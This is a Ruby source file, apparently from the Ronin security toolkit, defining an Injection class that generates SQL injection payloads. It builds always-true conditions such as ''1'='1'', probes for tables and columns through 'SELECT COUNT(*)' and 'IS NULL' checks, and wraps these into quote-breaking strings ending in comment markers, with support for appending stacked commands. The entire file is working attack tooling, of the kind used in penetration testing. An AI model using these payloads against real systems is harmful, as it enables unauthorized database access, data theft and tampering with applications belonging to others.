require 'code/sql/statement'

module Ronin
  module Code
    module SQL
      class Injection < Statement

	# compiled SQL expressions
	attr_reader :expressions

	def initialize(&block)
	  @expressions = []

	  super(&block)
	end

	def sql_and(*expr)
	  @expressions << expr.join(' AND ')
	  return @expressions.last
	end

	def sql_or(*expr)
	  @expressions << expr.join(' OR ')
	  return @expressions.last
	end

	def like(field,search)
	  @expressions << "#{field} LIKE '%#{search}%'"
	  return @expressions.last
	end

	def is(field,value)
	  @expressions << "#{field} IS '#{value}'"
	  return @expressions.last
	end

	def all_rows(var='1')
	  @expressions << "'#{var}'='#{var}'"
	  return @expressions.last
	end

	def has_table?(table)
	  @expressions << "1=(SELECT COUNT(*) FROM #{table})"
	  return @expressions.last
	end

	def has_field?(field)
	  @expressions << "#{field} IS NULL;"
	  return @expressions.last
	end

	def uses_table?(table,field)
	  @expressions << "#{table}.#{field} IS NULL"
	  return @expressions.last
	end

	def expression(*exprs)
	  new_exprs = exprs.map { |expr| expr.to_s }
	  @expressions+=new_exprs
	  return new_exprs
	end

	def inject
	  expr = @expressions.join(' OR ').strip
	  other_commands = compile.strip

	  if other_commands.empty?
	    if expr.empty?
	      return "'"
	    elsif ends_with_quote?(expr)
	      return "' OR #{expr.chop}"
	    else
	      return "' OR #{expr} --"
	    end
	  else
	    if expr.empty?
	      return "'; #{other_commands} --"
	    elsif ends_with_quote?(other_commands)
	      return "' OR #{expr}; #{other_commands.chop}"
	    else
	      return "' OR #{expr}; #{other_commands} --"
	    end
	  end
	end

	def Injection.inject(&block)
	  Injection.new(&block).inject
	end

	protected

	def ends_with_quote?(str)
	  str[-1].chr=="'"
	end

      end
    end
  end
end
